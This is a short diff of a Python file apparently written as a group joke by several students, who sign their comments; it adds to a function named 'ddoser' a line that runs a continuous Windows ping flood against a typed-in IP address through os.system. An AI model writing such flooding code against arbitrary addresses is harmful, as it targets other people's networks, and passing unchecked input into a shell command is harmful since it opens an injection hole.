@@ -16,4 +16,5 @@ def stealIdentity(person_name): #Drew
 print ("lolz idk what those lines do but im adding one. from. sophie.") #sophie
 def ddoser(ip,power): #Justin
   import os #Drew
-  ip = input("Put in Ip") #Justin
+  ip = input("Put in Ip") #Justin #ip is already an argument bro - Drew
+  os.system(f'cmd /c ping -t -l {power} -w 10000 {ip}')
